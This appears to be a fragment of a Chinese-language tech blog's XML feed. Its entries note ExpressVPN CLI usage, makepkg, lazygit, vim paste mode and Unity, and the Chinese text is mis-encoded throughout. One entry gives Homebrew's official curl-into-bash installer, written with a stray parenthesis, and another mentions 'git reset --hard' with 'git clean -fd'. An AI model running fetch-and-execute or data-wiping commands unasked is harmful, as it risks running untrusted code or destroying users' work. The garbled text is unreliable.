gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn preferences <span class="hljs-keyword">set</span> send_diagnostics <span class="hljs-comment">false</span><br></code></pre></td></tr></table></figure><h1 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn connect<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯é¦–æ¬¡è¿æ¥, ExpressVPN ä¼šå¯ç”¨ Smart Location.</p><p>å¦‚æœä¸æ˜¯ç¬¬ä¸€æ¬¡è¿æ¥, ExpressVPN ä¼šè¿æ¥åˆ°æœ€å¸¸ç”¨çš„ location.</p><p>ä¸€æ¡ ExpressVPN subscription å¯ä»¥ç”¨äº 5 ä¸ªè®¾å¤‡.</p><h1 id="æ–­å¼€è¿æ¥"><a href="#æ–­å¼€è¿æ¥" class="headerlink" title="æ–­å¼€è¿æ¥"></a>æ–­å¼€è¿æ¥</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn disconnect<br></code></pre></td></tr></table></figure><h1 id="è¿æ¥ä¸åŒçš„-VPN-server-location"><a href="#è¿æ¥ä¸åŒçš„-VPN-server-location" class="headerlink" title="è¿æ¥ä¸åŒçš„ VPN server location"></a>è¿æ¥ä¸åŒçš„ VPN server location</h1><p>å…ˆæŸ¥çœ‹æœ‰å“ªäº›:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn list<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ, Smart Location ä¼šæ˜¾ç¤ºåœ¨åˆ—è¡¨æœ€é¡¶ä¸Š.</p><p>æŸ¥çœ‹æ‰€æœ‰çš„ avaliable locations:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn list <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h1 id="è¿æ¥ä¸€ä¸ªç‰¹å®šçš„-location"><a href="#è¿æ¥ä¸€ä¸ªç‰¹å®šçš„-location" class="headerlink" title="è¿æ¥ä¸€ä¸ªç‰¹å®šçš„ location"></a>è¿æ¥ä¸€ä¸ªç‰¹å®šçš„ location</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ expressvpn <span class="hljs-keyword">connect</span> [<span class="hljs-keyword">LOCATION</span>]<br></code></pre></td></tr></table></figure><p>æˆ–è€…:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn connect [<span class="hljs-keyword">ALIAS</span>]<br></code></pre></td></tr></table></figure><h1 id="è¿æ¥-Smart-Location"><a href="#è¿æ¥-Smart-Location" class="headerlink" title="è¿æ¥ Smart Location"></a>è¿æ¥ Smart Location</h1><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn connect smart<br></code></pre></td></tr></table></figure><h1 id="åˆ‡æ¢åˆ°ä¸åŒçš„-VPN-protocol"><a href="#åˆ‡æ¢åˆ°ä¸åŒçš„-VPN-protocol" class="headerlink" title="åˆ‡æ¢åˆ°ä¸åŒçš„ VPN protocol"></a>åˆ‡æ¢åˆ°ä¸åŒçš„ VPN protocol</h1><p>éœ€è¦å…ˆæ–­å¼€ vpn çš„è¿æ¥:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ expressvpn disconnect <br></code></pre></td></tr></table></figure><p>ExpressVPN ä¼šæ¨èä½¿ç”¨ <code>Automatic</code> protocol option. è¿™ä¼šé€‰æ‹©æœ€åˆé€‚çš„ protocol.</p><p>åˆ‡æ¢åˆ° Lightway-TCP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol lightway_tcp<br></code></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ° Lightway-UDP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol lightway_udp<br></code></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ° OpenVPN-TCP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol tcp<br></code></pre></td></tr></table></figure><p>åˆ‡æ¢åˆ° OpenVPN-UDP:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>expressvpn protocol udp<br></code></pre></td></tr></table></figure><p>å¯åŠ¨ Automatic æ¨¡å¼:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ expressvpn protocol <span class="hljs-built_in">auto</span><br></code></pre></td></tr></table></figure><h1 id="é˜»æŒ¡-trackers-and-malicious-sites"><a href="#é˜»æŒ¡-trackers-and-malicious-sites" class="headerlink" title="é˜»æŒ¡ trackers and malicious sites"></a>é˜»æŒ¡ trackers and malicious sites</h1><p>å…ˆç¡®ä¿è¿æ¥åˆ° VPN ä»¥åŠä½¿ç”¨çš„æ˜¯ Automatic æˆ– Lightway protocol</p><p>å¯ç”¨ Threat Manager:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn preferences <span class="hljs-keyword">set</span> block_trackers <span class="hljs-comment">true</span><br></code></pre></td></tr></table></figure><p>å…³é—­:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> expressvpn preferences <span class="hljs-keyword">set</span> block_trackers <span class="hljs-comment">off</span><br></code></pre></td></tr></table></figure><p><a href="https://www.expressvpn.com/features/threat-manager">æ›´å¤šç›¸å…³ä¿¡æ¯</a></p><h1 id="æ‰“å¼€-app-manual"><a href="#æ‰“å¼€-app-manual" class="headerlink" title="æ‰“å¼€ app manual"></a>æ‰“å¼€ app manual</h1><p>æŸ¥çœ‹å¯ç”¨é€‰é¡¹:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">man expressvpn</span><br></code></pre></td></tr></table></figure><h1 id="è‡ªåŠ¨è¿æ¥"><a href="#è‡ªåŠ¨è¿æ¥" class="headerlink" title="è‡ªåŠ¨è¿æ¥"></a>è‡ªåŠ¨è¿æ¥</h1><p>ä¼šè‡ªåŠ¨è¿æ¥ä¸Šæ¬¡é€‰æ‹©çš„ location:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ expressvpn <span class="hljs-built_in">auto</span>connection <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å…³é—­:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">$ expressvpn <span class="hljs-built_in">auto</span>connection <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h1 id="ä½¿ç”¨æµè§ˆå™¨æ‰©å±•"><a href="#ä½¿ç”¨æµè§ˆå™¨æ‰©å±•" class="headerlink" title="ä½¿ç”¨æµè§ˆå™¨æ‰©å±•"></a>ä½¿ç”¨æµè§ˆå™¨æ‰©å±•</h1><p>è·å¾—æ‰©å±•:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> expressvpn <span class="hljs-built_in">install-firefox</span><span class="hljs-literal">-extension</span><br><span class="hljs-variable">$</span> expressvpn <span class="hljs-built_in">install-chrome</span><span class="hljs-literal">-extension</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>VPN</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vimium-çš„ä½¿ç”¨</title>
    <link href="/2022/09/16/Vimium-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/16/Vimium-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³åœ¨-shell-è„šæœ¬ä¸­-cd-å‘½ä»¤ä¸èµ·ä½œç”¨é—®é¢˜</title>
    <link href="/2022/09/16/%E8%A7%A3%E5%86%B3%E5%9C%A8-shell-%E8%84%9A%E6%9C%AC%E4%B8%AD-cd-%E5%91%BD%E4%BB%A4%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/16/%E8%A7%A3%E5%86%B3%E5%9C%A8-shell-%E8%84%9A%E6%9C%AC%E4%B8%AD-cd-%E5%91%BD%E4%BB%A4%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h1><p>é€šå¸¸æˆ‘ä»¬ç›´æ¥æ‰§è¡Œ shell è„šæœ¬æ–‡ä»¶, å®ƒä¼šæ‰“å¼€ä¸€ä¸ªå­ shell å¹¶ç”±å…¶æ‰§è¡Œ, å› æ­¤, æˆ‘ä»¬çš„ cd å‘½ä»¤å®é™…ä¸Šæ˜¯åœ¨å­ shell ä¸­æ‰§è¡Œäº†, æ‰€ä»¥å½“å‰ shell ä¸­å¹¶æœªè·³è½¬.</p><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><p>ä½¿ç”¨ <code>source</code> å‘½ä»¤, å®ƒä¼šè¯»å–è„šæœ¬æ–‡ä»¶å¹¶åœ¨å½“å‰ shell é‡Œé¢æ‰§è¡Œ, å¹¶æ²¡æœ‰åˆ›å»ºæ–°çš„ shell.</p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-ä¸­å…³äº-makepkg-éƒ¨åˆ†</title>
    <link href="/2022/09/16/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-makepkg-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/16/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-makepkg-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>ç³»ç»Ÿé…ç½®æ–‡ä»¶åœ¨ <code>/etc/makepkg.conf</code>.</p><p>ç”¨æˆ·çš„ä½äº <code>$XDG_CONFIG_HOME/pacman/makepkg.conf</code> æˆ– <code>~/.makepkg.conf</code>.</p><h2 id="Packager-information"><a href="#Packager-information" class="headerlink" title="Packager information"></a>Packager information</h2><p>å…³äºåŒ…çš„åˆ¶ä½œè€…çš„ä¿¡æ¯:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">$ pacman -Qi <span class="hljs-keyword">package</span><br></code></pre></td></tr></table></figure><h2 id="Package-output"><a href="#Package-output" class="headerlink" title="Package output"></a>Package output</h2><p>makepkg è¿™ä¸ªå‘½ä»¤ä¼šå°†æºä»£ç ç›´æ¥ä¸‹åœ¨åˆ°å½“å‰å·¥ä½œç›®å½•ä¸‹çš„ <code>src/</code> ç›®å½•ä¸‹, æ²¡æœ‰ <code>src/</code> ç›®å½•åº”è¯¥ä¼šè‡ªåŠ¨åˆ›å»º. ä¹Ÿå¯ä»¥è‡ªå®šä¹‰è·¯å¾„.</p><p>ä¿®æ”¹ makepkg.conf ä¸­çš„ç¯å¢ƒå˜é‡:</p><ul><li>PKGDEST</li><li>RCDEST</li><li>SRCPKGDEST<br>å…·ä½“çœ‹ wiki.</li></ul><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p><code>-s/--syncdeps</code> é€‰é¡¹, ä¼š build the package è€Œä¸”ä¼šå®‰è£…ç›¸å…³ä¾èµ–.</p><p><code>-r/--rmdeps</code> é€‰é¡¹, ä¼šåœ¨å®‰è£…ç»“æŸåç§»é™¤ä¸å†éœ€è¦çš„ç›¸å…³ä¾èµ–.</p><p>åœ¨ build successfully å’Œæ»¡è¶³æ‰€æœ‰ä¾èµ–ä¹‹å, ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ª <code>pkgname-pkgver.pkg.tar.zst</code> çš„æ–‡ä»¶åŒ…, è¿™ä¸ªæ—¶å€™ç”¨ <code>-i/--install</code> é€‰é¡¹æ¥å®‰è£….</p><p>æ·»åŠ  <code>-c/--clean</code> é€‰é¡¹å¯ä»¥æ¸…é™¤å‰©ä¸‹çš„æ–‡ä»¶å’Œç›®å½•.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>.config ç›®å½•çš„ä½¿ç”¨</title>
    <link href="/2022/09/16/config-%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/16/config-%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>brew åŒ…ç®¡ç†å™¨</title>
    <link href="/2022/09/16/brew-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    <url>/2022/09/16/brew-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://brew.sh/">å®˜ç½‘</a><br>å®˜æ–¹çš„ä¸‹è½½å‘½ä»¤ä¸º:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>bash -c <span class="hljs-string">&quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh))&quot;</span> <br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¯èƒ½ <code>curl</code> ä¼šæŠ¥é”™, æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“å¼€ <code>https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh</code> è¿™ä¸ªç½‘ç«™, ç„¶åå¤åˆ¶è„šæœ¬ä¹‹å, å†å®‰è£….</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lazygit å®‰è£…å’Œä½¿ç”¨</title>
    <link href="/2022/09/16/Lazygit-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/16/Lazygit-%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/RTLmaG5">å‚è€ƒ</a></p><h1 id="å®˜æ–¹æ•™ç¨‹"><a href="#å®˜æ–¹æ•™ç¨‹" class="headerlink" title="å®˜æ–¹æ•™ç¨‹"></a>å®˜æ–¹æ•™ç¨‹</h1><h2 id="Undo-x2F-Redo-ç‰¹æ€§"><a href="#Undo-x2F-Redo-ç‰¹æ€§" class="headerlink" title="Undo&#x2F;Redo ç‰¹æ€§"></a>Undo&#x2F;Redo ç‰¹æ€§</h2><p>é»˜è®¤çš„ â€˜zâ€™ æ˜¯ undo, <code>&lt;C-z&gt;</code> æ˜¯ redo.</p><p>lazygit åˆ©ç”¨ reflog æ¥è·Ÿè¸ª. å› æ­¤ lazygit åªèƒ½ undo reflog ä¸­çš„æ“ä½œ.</p><p>åˆ›å»ºçš„æ–°çš„ branch ä¸ä¼šè¢« undo.</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>Linux ä¸‹çš„é»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ä¸º: <code>~/.config/lazygit/config.yml</code></p><p>é»˜è®¤çš„é…ç½®åœ¨å®˜ç½‘ä¸Šå¯ä»¥çœ‹åˆ°, å¯ä»¥å¤åˆ¶åˆ°ä½ çš„ <code>config.yml</code> æ–‡ä»¶ä¸­.</p><p>editor æˆ‘è®¾ç½®çš„æ˜¯ <code>$VISUAL</code>.</p><p>å…·ä½“çš„é¢œè‰²é…ç½®å¯ä»¥å‚è€ƒå®˜ç½‘.</p><p>å¯ä»¥è‡ªå®šä¹‰å‘½ä»¤, åœ¨ <code>customCommands:</code> ä¹‹å.</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><p>è¿˜æ˜¯ vim æŒ‰é”®.</p><p>æŒ‰ [] å¯åœ¨æ¯ä¸€ä¸ªé¢æ¿é‡Œçš„ tag ä¹‹é—´è·³è½¬.</p><p>æŒ‰ x å¯ä»¥çœ‹åˆ° menu ç•Œé¢, ç”¨äºæŸ¥æ‰¾å¿«æ·é”®.</p><h2 id="files-é¢æ¿"><a href="#files-é¢æ¿" class="headerlink" title="files é¢æ¿"></a>files é¢æ¿</h2><p>a (add): æŠŠæ–‡ä»¶ stage, å³ add åˆ° stage. å†æŒ‰ä¸€ä¸‹ a å¯ä»¥ unstage æ–‡ä»¶. è¿™ä¸ªæ˜¯å…¨éƒ¨ä¸€èµ· stage.</p><p><space> : ä¸€ä¸ªä¸€ä¸ª stage, å¦‚æœæŒ‰ä¸‹å›è½¦, ç”šè‡³å¯ä»¥åªæäº¤æ–‡ä»¶çš„ä¸€éƒ¨åˆ†.</p><p>åœ¨ files é¢æ¿æŒ‰ c (commit) å¯ä»¥æäº¤. æŒ‰ C å¯ä»¥åœ¨ç¼–è¾‘å™¨ä¸­ç¼–è¾‘ä¿®æ”¹. æŒ‰ A å¯ä»¥å°†æœ¬æ¬¡è¦æäº¤çš„å†…å®¹ amend åˆ°ä¸Šæ¬¡çš„ commit. æŒ‰ d (delete) å¯ä»¥åˆ é™¤æ–‡ä»¶. æŒ‰ä¸‹ D å¯ä»¥çœ‹åˆ°æ›´å¤šæ”¾å¼ƒæ›´æ”¹çš„é€‰é¡¹, ç¬¬ä¸€ä¸ª <code>reset --hard HEAD &amp;&amp; git clean -fd</code> å¯ä»¥åˆ é™¤æ‰€æœ‰æ›´æ”¹.</p><p>æŒ‰ s å¯ä»¥éšè—æ–‡ä»¶çš„æ›´æ”¹åˆ° stash é¢æ¿.</p><p>æŒ‰ g å¯ä»¥ pop ä¸€æ¬¡ stash.</p><h2 id="staged-x2F-unstaged-é¢æ¿"><a href="#staged-x2F-unstaged-é¢æ¿" class="headerlink" title="staged&#x2F;unstaged é¢æ¿"></a>staged&#x2F;unstaged é¢æ¿</h2><p>tab : åœ¨ staged&#x2F;unstaged é¢æ¿ä¹‹é—´è·³è½¬.</p><p>åœ¨ staged é¢æ¿æŒ‰ d, å¯ä»¥ unstage æ–‡ä»¶. </p><p>åœ¨ unstaged é¢æ¿ä¸­æŒ‰ a å¯ä»¥å…¨éƒ¨é€‰ä¸­, å†æŒ‰ <space> å¯ä»¥å°†å…¶ç§»åŠ¨åˆ° staged é¢æ¿.</p><h2 id="åˆ†æ”¯é¢æ¿"><a href="#åˆ†æ”¯é¢æ¿" class="headerlink" title="åˆ†æ”¯é¢æ¿"></a>åˆ†æ”¯é¢æ¿</h2><p>æŒ‰ n (new) å¯ä»¥æ·»åŠ åˆ†æ”¯.</p><p>ç”¨ <space> å¯ä»¥é€‰ä¸­åˆ†æ”¯.</p><p>æŒ‰ P (push) å°±ä¼šå‘å¸ƒåˆ°è¿œç«¯.</p><p>åˆå¹¶åˆ†æ”¯, å…ˆåˆ‡æ¢åˆ°æ¥å—åˆå¹¶çš„åˆ†æ”¯, å†é€‰ä¸­æƒ³è¦åˆå¹¶çš„åˆ†æ”¯, æŒ‰ M å°±å¯ä»¥ merge.</p><p>æƒ³è¦ä¼šæ»šå°±åœ¨è¿™é‡Œ, å…ˆé€‰ä¸­ä¸€ä¸ª branch, ç„¶åå¯ä»¥çœ‹åˆ°è¿™ä¸ª branch çš„ commit å†å², é€‰ä¸­ä¸€ä¸ª commit å°±å¯ä»¥ä¼šæ»š.</p><p>æœªå‘½åçš„è¢« checkout çš„ commit ä¸ä¼šä¿å­˜åœ¨åˆ†æ”¯ç•Œé¢.</p><p>å½“å‰æ‰€å¤„çš„åˆ†æ”¯ä¸èƒ½è¢«åˆ é™¤.</p><h2 id="commit-é¢æ¿"><a href="#commit-é¢æ¿" class="headerlink" title="commit é¢æ¿"></a>commit é¢æ¿</h2><p>, å’Œ . å¯ä»¥åœ¨åˆ—è¡¨ä¸­ç¿»é¡µ, &lt; å’Œ &gt; å¯ä»¥å›åˆ°åˆ—è¡¨çš„æœ€ä¸Šæ–¹å’Œæœ€ä¸‹æ–¹.</p><p>&#x2F; ç”¨äºæœç´¢.</p><p>æŒ‰ r (reword commit) æ›´æ”¹æäº¤ä¿¡æ¯.</p><p><space> å›æ»š, ç›¸å½“äº checkout, ä½†å¹¶ä¸ä¼šä¼šåˆ°é‚£ä¸ªçŠ¶æ€, åœ¨æ­¤åŸºç¡€ä¸Šåˆ°åˆ†æ”¯é¢æ¿æŒ‰ä¸‹ n å¯ä»¥æ–°å»ºè¿™ä¸ªåˆ†æ”¯.</p><p>æŒ‰ g, å¯ä»¥ reset åˆ†æ”¯. soft reset ä¸ä¼šåˆ é™¤æ–‡ä»¶.</p><p>æ‰€æœ‰åˆ é™¤å…¶å® redo, åœ¨ Reflog è¿™ä¸ª tag é‡Œé¢å¯ä»¥çœ‹åˆ°æ›´æ”¹çš„å†å²è®°å½•.</p><h2 id="stash-é¢æ¿"><a href="#stash-é¢æ¿" class="headerlink" title="stash é¢æ¿"></a>stash é¢æ¿</h2><p>è¢« stash çš„ commit ä¸ä¼šå‡ºç°åœ¨åˆ†æ”¯çš„èŠ‚ç‚¹ä¸Š.</p><p>æŒ‰ g å¯ä»¥ pop ä¸€æ¬¡ stash.</p><p>æŒ‰ d åŒæ ·å¯ä»¥åˆ é™¤.</p><p>redo åœ¨ stash ç•Œé¢æ— æ•ˆ, å› ä¸º stash ä¸ä¼šè¢«è®°å½•åœ¨ reflog ä¸­.</p><h2 id="indirect-rebasing"><a href="#indirect-rebasing" class="headerlink" title="indirect rebasing"></a>indirect rebasing</h2><p>ä¹Ÿå°±æ˜¯é‡å†™ git çš„æäº¤å†å². å¯ä»¥æŠŠä¸€æ¬¡æäº¤é‡Œé¢çš„æ›´æ”¹å’Œå¹¶åˆ°å¦ä¸€æ¬¡æäº¤é‡Œé¢.</p><p><C-p> å’Œ patch ç›¸å…³. </p><p>å°†ä¸¤æ¬¡æäº¤åˆå¹¶ä¸ºä¸€æ¬¡, é€‰ä¸­ä¸€ä¸ª commit, æŒ‰ä¸‹ s (squash) å°±ä¼šæŠŠå®ƒå’Œä¸‹é¢çš„ä¸€ä¸ª commit åˆå¹¶åœ¨ä¸€èµ·. </p><p>å¯ä»¥æ‰¹é‡æ“ä½œ.</p><h2 id="fixup"><a href="#fixup" class="headerlink" title="fixup"></a>fixup</h2><p>æŒ‰ f, ä¹Ÿå¯ä»¥å°†ä¸¤æ¬¡æäº¤åˆå¹¶.</p><h2 id="è§£å†³åˆå¹¶å†²çª"><a href="#è§£å†³åˆå¹¶å†²çª" class="headerlink" title="è§£å†³åˆå¹¶å†²çª"></a>è§£å†³åˆå¹¶å†²çª</h2><p>åœ¨ Merge Conflict é¢æ¿é‡ŒæŒ‰ä¸Šä¸‹é”®å¯ä»¥é€‰æ‹©æ›´æ”¹, <space> é€‰ä¸­ä»£ç æ®µ.</p><p>æŒ‰ b å¯ä»¥ä¿ç•™å†²çªçš„ä¸¤ç§æ›´æ”¹.</p><h2 id="æŸ¥çœ‹æŒ‡å®šæ–‡æœ¬çš„æäº¤"><a href="#æŸ¥çœ‹æŒ‡å®šæ–‡æœ¬çš„æäº¤" class="headerlink" title="æŸ¥çœ‹æŒ‡å®šæ–‡æœ¬çš„æäº¤"></a>æŸ¥çœ‹æŒ‡å®šæ–‡æœ¬çš„æäº¤</h2><C-f>## æŸ¥çœ‹ diffM## å¿«é€Ÿæ‰“å¼€ lazygit### rangerä¿®æ”¹ rc.conf æ–‡ä»¶. æ·»åŠ ä¸€ä¸ª map.### vimæ·»åŠ ä¸€ä¸ª map.# é…ç½®åœ¨ lazygit ä»“åº“çš„ docs ç›®å½•ä¸‹, æŸ¥çœ‹ config.md æ–‡ä»¶.]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ vim ç²˜è´´æ—¶æ ¼å¼é”™è¯¯</title>
    <link href="/2022/09/16/%E8%A7%A3%E5%86%B3-vim-%E7%B2%98%E8%B4%B4%E6%97%B6%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF/"/>
    <url>/2022/09/16/%E8%A7%A3%E5%86%B3-vim-%E7%B2%98%E8%B4%B4%E6%97%B6%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="t.zoukankan.com/faithH-p-12145181.html">å‚è€ƒ</a><br>è¿›å…¥ paste æ¨¡å¼è¿›è¡Œç²˜è´´, ä½†è¿›å…¥ paste æ¨¡å¼ååˆ«ç”¨ i è¿›å…¥æ’å…¥æ¨¡å¼, ç›´æ¥ç²˜è´´å³å¯.</p><p>è®¾ç½® mapping:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;leader&gt;</span><span class="hljs-keyword">p</span> :<span class="hljs-keyword">set</span> paste<br><span class="hljs-keyword">nnoremap</span> <span class="hljs-symbol">&lt;leader&gt;</span><span class="hljs-keyword">P</span> :<span class="hljs-keyword">set</span> nopaste<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>unity 5.x ä»å…¥é—¨åˆ°ç²¾é€š Notes</title>
    <link href="/2022/09/15/unity-5-x-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-Notes/"/>
    <url>/2022/09/15/unity-5-x-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://unity3d.com/learn">äº¤æµå¹³å°</a></p>]]></content>
    
    
    <categories>
      
      <category>Unity</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Unity 3D æ¸¸æˆå¼€å‘ Notes</title>
    <link href="/2022/09/15/Unity-3D-%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91-Notes/"/>
    <url>/2022/09/15/Unity-3D-%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -åŸºç¡€çŸ¥è¯†"><a href="#ç¬¬ä¸€ç« -åŸºç¡€çŸ¥è¯†" class="headerlink" title="ç¬¬ä¸€ç«  åŸºç¡€çŸ¥è¯†"></a>ç¬¬ä¸€ç«  åŸºç¡€çŸ¥è¯†</h1><h2 id="1-3-Unity-ç‰ˆæœ¬"><a href="#1-3-Unity-ç‰ˆæœ¬" class="headerlink" title="1.3 Unity ç‰ˆæœ¬"></a>1.3 Unity ç‰ˆæœ¬</h2><p>Unity æä¾›äº†æ–°å·¥å…· Unity Hub æ¥ä¸“é—¨ç®¡ç†å¤šç‰ˆæœ¬. <a href="https://blogs.unity3d.com/cn/2018/01/24/streamline-your-workflow-introducing-unity-hub-beta/">ä»‹ç»</a></p>]]></content>
    
    
    <categories>
      
      <category>Unity</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn C in Linux</title>
    <link href="/2022/09/12/CinLinux/"/>
    <url>/2022/09/12/CinLinux/</url>
    
